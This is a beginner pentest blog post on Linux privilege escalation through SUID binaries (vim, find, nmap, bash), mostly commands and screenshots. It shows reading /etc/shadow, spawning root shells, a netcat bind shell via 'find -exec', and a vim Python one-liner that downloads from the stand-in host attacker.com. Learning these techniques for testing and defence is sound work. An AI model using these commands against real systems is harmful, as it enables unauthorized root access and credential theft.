--- 
titile: The art of gaining root 
author: Software User
date: 2021-03-17 16:31:00 +0800
category: pentest
tags: [linux,privesc,root,root-shell]
--- 

---
<strong><span style="color:#06bf04">Hi Guys, This is my First blog about Linux Privilege escalation. So Without wasting any time Let’s Start I’ll start with basics. </span></strong>


![Desktop View]({{ "/assets/img/pentest/the-art-of-gaining-root/1.png" | relative_url }})

--

# So, What is Linux and Privilege Escalation

1. Linux -: Linux is the best-known and most-used open-source operating system. As an operating system, Linux is software that sits underneath all of the other software on a computer, receiving requests from those programs and relaying these requests to the computer’s hardware.

2. PRIVILEGE ESCALATION -: Privilege escalation is a common way for attackers to gain unauthorized access to systems within a security perimeter.

3. Attackers start by finding weak points in an organization’s defenses and gaining access to a system. In many cases that the first point of penetration will not grant attackers with the level of access or data they need. They will then attempt privilege escalation to gain more permissions or obtain access to additional, more sensitive systems.

# Why Privilege Escalation is Important ?

While usually not the main aim of an attacker, privilege escalation is frequently used in preparation for a more specific attack, allowing intruders to deploy a malicious payload or execute malicious code in the targeted system. This means that whenever you detect or suspect privilege escalation, you also need to look for signs of other malicious activity. However, even without evidence of further attacks, any privilege escalation incident is an information security issue in itself, because someone could have gained unauthorized access to personal, confidential, or otherwise sensitive data. In many cases, this will have to be reported internally or to the relevant authorities to ensure compliance.

So here we covered some theoretical part the meaning of privilege escalation is gaining access on the root with a non-root account.

# Privilege Escalation through SUID 

<strong>SUID</strong> setuid and setgid are Unix access rights flags that allow users to run an executable.

![Desktop View]({{ "/assets/img/pentest/the-art-of-gaining-root/2.png" | relative_url }})

### List of executables -:

1. vim
2. find
3. Nmap
4. bash
5. less
6. more

# How to Find Files with SUID Set in Linux?

```bash
find . -perm /4000
```

![Desktop View]({{ "/assets/img/pentest/the-art-of-gaining-root/3.png" | relative_url }})

you can add more things in this like -l(long listing).

# 1. VIM -: 
Vim is a highly configurable text editor built to enable efficient text editing. It is an improved version of the vi editor distributed with most UNIX/Linux systems. If vim is running as a suid it can access some root files.
You can access any file you can do many things like spawning shell.

like this -:

### 1. vim.tiny /etc/shadow

![Desktop View]({{ "/assets/img/pentest/the-art-of-gaining-root/4.png" | relative_url }})

1. Press ESC key

:set shell=/bin/sh

:shell

![Desktop View]({{ "/assets/img/pentest/the-art-of-gaining-root/5.png" | relative_url }})

1. file download -:

```markdown
export URL=http://attacker.com/file_to_get

export LFILE=file_to_save

vim -c ‘:py import vim,sys; from os import environ as e

if sys.version_info.major == 3: import urllib.request as r

else: import urllib as r

r.urlretrieve(e[“URL”], e[“LFILE”])

vim.command(“:q!”)’
```
for more checkout [here](https://gtfobins.github.io/gtfobins/vim/
)


# 2. Find

find -: find is used to find files


```bash
touch *****
find ***** -exec whoami \;
```
![Desktop View]({{ "/assets/img/pentest/the-art-of-gaining-root/6.png" | relative_url }})

![Desktop View]({{ "/assets/img/pentest/the-art-of-gaining-root/7.png" | relative_url }})

getting shell

```bash
find / -name software_user -exec netcat -lvp 5555 -e /bin/sh \;
netcat 192.*.*.* 5555
```

![Desktop View]({{ "/assets/img/pentest/the-art-of-gaining-root/8.png" | relative_url }})

# 3. NMAP

nmap -: Older versions of Nmap (2.02 to 5.21) had an interactive mode. and through this interactive mode, you can spawn root shell.

1. nmap -V (for finding version )

2. nmap — interactive
    
3. nmap> !sh

4. whoami

5. root

![Desktop View]({{ "/assets/img/pentest/the-art-of-gaining-root/9.png" | relative_url }})

# 4. BASH

bash -: On Linux, bash is the standard shell .
open a bash shell as root.

1. ```bash -p```

